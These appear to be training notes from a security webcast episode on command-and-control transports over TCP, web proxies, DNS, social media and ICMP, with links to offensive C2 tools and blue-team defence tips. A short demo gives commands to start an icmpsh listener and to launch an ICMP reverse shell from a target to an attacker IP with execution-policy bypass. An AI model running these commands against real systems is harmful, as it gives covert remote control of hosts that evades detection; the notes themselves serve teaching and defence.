Command & Control 101: Transports - Tradecraft Security Weekly #9

LINKS: 
Dnscat - https://github.com/iagox86/dnscat2 
Gcat - https://github.com/byt3bl33d3r/gcat
PowerShellICMP - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1
icmpsh - https://github.com/inquisb/icmpsh 
Week of PowerShell Shells - http://www.labofapenetrationtester.co...

# Command & Control
- Infrastructure used to carry out remote communication with hosts
- A number of different transport mechanisms can be utilized
- Some tend to be more stealthy than others
- Many network security appliances are trying in various ways to detect these
- But....bypasses exist and custom tools get right by
# C2 Over TCP
![f5393538bdb7efda9651e5307abfa251.png](../_resources/4e343162db87454cbe91d492036163cf.png)
# C2 Through A Web Proxy
- most common
![262794a43e8c22bc16577809f1f36034.png](../_resources/924afc771f8441f7a36f89aa7d7b875b.png)
# C2 Over DNS
- most sneaky
![83b4d6d29b29f409a93760bd17c02f44.png](../_resources/871092fa4b5044c593edda05cb441dca.png)
# C2 Over WebApps / Social Media
![20a167097f27d66044ada45684458a04.png](../_resources/b375efe75fe94d33a8d3dab1b8160d9b.png)
# C2 Over ICMP
- not well known
![2c5b1096ad5ff9277d1bbabec516516d.png](../_resources/6324b45c0485474aa4434f6a7311709c.png)

# PowerShellICMP DEMO
On Attackbox disable ICMP to other stuff
```
# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_my.py attackip victimip
```
On Target
```
C:\ powershell.exe -exec bypass
PS> Import-Module .\Invoke-PowerShellIcmp.ps1
PS> Invoke-PowerShellIcmp myattackc2ip
```
# For the Blue Team
- Lock down egress filtering
- Don't blindly trust IPS rules for specific tools; Test them.
- Know that there are still ways to get around categorization (see Episode #4)
- Focus on client-side protections to help prevent payloads from launching in the first place.